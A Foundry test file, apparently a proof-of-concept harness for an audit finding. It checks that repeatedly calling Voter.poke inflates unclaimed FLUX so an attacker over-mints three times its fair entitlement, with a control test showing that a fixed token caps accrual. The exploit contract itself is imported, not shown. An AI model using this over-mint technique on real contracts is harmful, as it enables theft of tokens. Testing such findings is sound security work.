// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    FluxToken,
    FluxTokenFixed,
    VotingEscrowDouble,
    VoterDouble
} from "./38196-malicious-user-can-steal-flux-token-by-abusing-voterpoke-imm.sol";

contract FluxTokenPokeOverMintTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant TOKEN_ID = 1;
    uint256 internal constant VOTING_POWER = 2 ether; // -> claimableFlux = 1 ether/epoch

    // Attacker EOA repeatedly pokes -> unclaimedFlux inflates -> claimFlux over-mints.
    function test_exploit_pokeInflatesUnclaimedFlux_overMintsFlux() public {
        Exploit e = new Exploit();
        e.run();

        FluxToken flux = FluxToken(e.fluxAddr());

        // Fair single-epoch entitlement is exactly 1 FLUX (2 ether power * 50%).
        assertEq(e.fairSingleEpoch(), 1 ether, "fair single-epoch entitlement");

        // 3 pokes in one epoch tripled unclaimedFlux with no bound.
        assertEq(e.buggyUnclaimed(), 3 ether, "unclaimedFlux tripled by 3 pokes");

        // claimFlux minted the full inflated 3 FLUX to the attacker EOA.
        assertEq(flux.balanceOf(ATTACKER), 3 ether, "attacker minted 3x FLUX");
        assertEq(e.attackerMinted(), 3 ether, "attacker minted 3x FLUX (exposed)");

        // HARM: 2 FLUX of illegitimate over-mint beyond the fair single epoch.
        assertEq(e.excessStolen(), 2 ether, "2 FLUX stolen over-mint");
        assertGt(e.attackerMinted(), e.fairSingleEpoch(), "over-mint > fair entitlement");
        assertEq(e.attackerMinted(), 3 * e.fairSingleEpoch(), "exactly 3x over-mint");
    }

    // Negative control: identical scenario against FluxTokenFixed, whose accrueFlux
    // credits claimableFlux at most once per epoch -> repeated pokes mint only 1x.
    function test_control_fixedAccrueOncePerEpoch_noOverMint() public {
        FluxTokenFixed flux = new FluxTokenFixed(address(this)); // this = minter/voter/veALCX/admin
        VotingEscrowDouble ve = new VotingEscrowDouble(ATTACKER, address(this), VOTING_POWER, TOKEN_ID);
        VoterDouble voter = new VoterDouble(address(flux));

        flux.setVeALCX(address(ve));
        flux.setVoter(address(voter));

        uint256 fair = ve.claimableFlux(TOKEN_ID);
        assertEq(fair, 1 ether, "fair single-epoch entitlement");

        // Poke the SAME number of times as the exploit.
        voter.poke(TOKEN_ID);
        voter.poke(TOKEN_ID);
        voter.poke(TOKEN_ID);

        // Fixed: unclaimedFlux is capped at one epoch's worth despite 3 pokes.
        assertEq(flux.getUnclaimedFlux(TOKEN_ID), 1 ether, "fixed caps accrual at 1x per epoch");

        // Claim mints only the fair single-epoch amount — no over-mint.
        flux.claimFlux(TOKEN_ID, flux.getUnclaimedFlux(TOKEN_ID));
        assertEq(flux.balanceOf(ATTACKER), 1 ether, "fixed mints only fair 1x FLUX");
        assertEq(flux.balanceOf(ATTACKER), fair, "no excess over the fair entitlement");
    }
}
